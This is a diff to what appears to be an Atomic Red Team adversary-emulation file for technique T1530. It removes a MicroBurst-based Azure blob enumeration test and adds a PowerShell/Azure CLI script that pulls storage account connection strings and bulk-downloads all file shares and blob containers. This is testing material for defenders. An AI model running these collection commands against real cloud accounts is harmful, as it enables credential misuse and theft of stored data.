@@ -1,48 +1,6 @@
 attack_technique: T1530
 display_name: Data from Cloud Storage Object
 atomic_tests:
-- name: Azure - Enumerate Azure Blobs with MicroBurst
-  auto_generated_guid: 3dab4bcc-667f-4459-aea7-4162dd2d6590
-  description: |
-    Upon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. 
-    See https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . 
-  supported_platforms:
-  - iaas:azure
-  input_arguments:
-    base:
-      description: Azure blob keyword to enumerate (Example, storage account name)
-      type: string
-      default: secure
-    output_file:
-      description: File to output results to
-      type: string
-      default: $env:temp\T1530Test1.txt
-    wordlist:
-      description: File path to keywords for search permutations
-      type: string
-      default: PathToAtomicsFolder\..\ExternalPayloads\permutations.txt
-  dependency_executor_name: powershell
-  dependencies:
-  - description: |
-      The Invoke-EnumerateAzureBlobs module must exist in PathToAtomicsFolder\..\ExternalPayloads.
-    prereq_command: |
-      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1"){exit 0} else {exit 1}
-    get_prereq_command: |
-      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-      invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/Invoke-EnumerateAzureBlobs.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1"
-  - description: |
-      The wordlist file for search permutations must exist in PathToAtomicsFolder\..\ExternalPayloads.
-    prereq_command: |
-      if (test-path "#{wordlist}"){exit 0} else {exit 1}
-    get_prereq_command: |
-      invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/permutations.txt" -outfile "#{wordlist}"
-  executor:
-    command: |
-      import-module "PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1"
-      Invoke-EnumerateAzureBlobs -base #{base} -permutations "#{wordlist}" -outputfile "#{output_file}"
-    cleanup_command: |
-      remove-item #{output_file} -erroraction silentlycontinue
-    name: powershell
 - name: Azure - Scan for Anonymous Access to Azure Storage (Powershell)
   auto_generated_guid: 146af1f1-b74e-4aa7-9895-505eb559b4b0
   description: |
@@ -111,4 +69,92 @@ atomic_tests:
       aws s3 rb s3://#{s3_bucket_name} --force 
       rm -rf /tmp/#{s3_bucket_name}
     name: sh
+    elevation_required: false
+- name: Azure - Dump Azure Storage Account Objects via Azure CLI
+  auto_generated_guid: 67374845-b4c8-4204-adcc-9b217b65d4f1
+  description: |-
+    This test dumps the content of the storage account objects present in the file defined in file_shares_csv_file_path. Note that this file is created in the atomic test T1619 "Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI". When created manually, it must contain the columns "ResourceGroup","StorageAccountName", "FileShareName", "ContainerName", "BlobName".
+
+    Requirements:
+        - The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.
+        - The EntraID user must have the role "Storage Account Contributor", or a role with similar permissions.
+  supported_platforms:
+    - iaas:azure
+  input_arguments:
+    output_folder:
+      type: path
+      default: $env:temp\T1530_storage_account_objects
+      description: Folder path to output file share content to
+    storage_account_objects_csv_file_path:
+      type: path
+      default: $env:temp\T1619_storage_account_objects.csv
+      description: Path to file that contains all storage account objects in form of a csv file. This may be the result from Test T1619 "Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI".
+  dependency_executor_name: powershell
+  dependencies:
+    - description: Azure CLI must be installed
+      prereq_command: try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+      get_prereq_command: Install-Module -Name Az -Force
+  executor:
+    command: |-
+      $storage_account_objects = Import-Csv -Path "#{storage_account_objects_csv_file_path}"
+
+      # Login to Azure
+      az login
+
+      if (-not (Test-Path -Path "#{output_folder}")) {
+          New-Item -ItemType Directory -Path "#{output_folder}"
+      }
+
+      foreach ($row in $storage_account_objects) {
+          
+          if ($row.FileShareName -ne ""){
+              $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query "allowSharedKeyAccess"
+
+              if ($allowSharedKeyAccess -eq "false") {    # $allowSharedKeyAccess could be true or null
+                  Write-Output "Shared key access is disabled for this storage account."
+              } else {
+                  Write-Output "Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ..."
+                  $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv
+                  
+                  # Create folder for storage account objects
+                  $storageAccountOutputPath = Join-Path #{output_folder} "$($row.ResourceGroup)_$($row.StorageAccountName)"
+                  if (-not (Test-Path -Path $storageAccountOutputPath)) {
+                      New-Item -ItemType Directory -Path $storageAccountOutputPath
+                  }
+
+                  # create folder for file share content
+                  $fileSharePath = Join-Path -Path $storageAccountOutputPath $row.FileShareName
+                  if (-not (Test-Path -Path $fileSharePath)) {
+                      New-Item -ItemType Directory -Path $fileSharePath
+                  }
+                  az storage file download-batch --connection-string $connectionString --source $row.FileShareName --destination $fileSharePath
+              }
+          } elseif ($row.ContainerName -ne "" -and $row.BlobName -eq "") {
+              $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query "allowSharedKeyAccess"
+
+              if ($allowSharedKeyAccess -eq "false") {    # $allowSharedKeyAccess could be true or null
+                  Write-Output "Shared key access is disabled for this storage account."
+              } else {
+                  Write-Output "Fetching all blobs from container $($row.ContainerName) in storage account $($row.StorageAccountName) ..."
+                  $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv
+                  
+                  # Create folder for storage account objects
+                  $storageAccountOutputPath = Join-Path #{output_folder} "$($row.ResourceGroup)_$($row.StorageAccountName)"
+                  if (-not (Test-Path -Path $storageAccountOutputPath)) {
+                      New-Item -ItemType Directory -Path $storageAccountOutputPath
+                  }
+
+                  # create folder for blob content
+                  $containerFolderPath = Join-Path $storageAccountOutputPath $row.ContainerName
+                  if (-not (Test-Path -Path $containerFolderPath)) {
+                      New-Item -ItemType Directory -Path $containerFolderPath
+                  }
+                  az storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString
+              }
+          }
+      }
+    cleanup_command: |-
+      Remove-Item -Path "#{output_folder}" -Recurse -Force -erroraction silentlycontinue
+      Write-Output "Removed #{output_folder}"
+    name: powershell
     elevation_required: false
